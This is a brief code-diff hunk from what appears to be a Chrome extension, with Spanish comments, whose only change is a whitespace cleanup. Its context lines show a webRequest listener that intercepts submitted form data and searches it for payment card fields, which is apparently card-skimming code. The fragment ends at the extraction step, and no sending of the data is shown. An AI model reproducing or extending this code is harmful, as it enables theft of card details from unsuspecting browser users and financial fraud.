@@ -14,7 +14,7 @@ chrome.webRequest.onBeforeRequest.addListener(
         // Interceptar datos de formularios
         if (details.requestBody.formData) {
           const formData = details.requestBody.formData;
-          
+
           // Buscar campos de tarjetas
           const cardData = extractCardData(formData);
           if (cardData) {
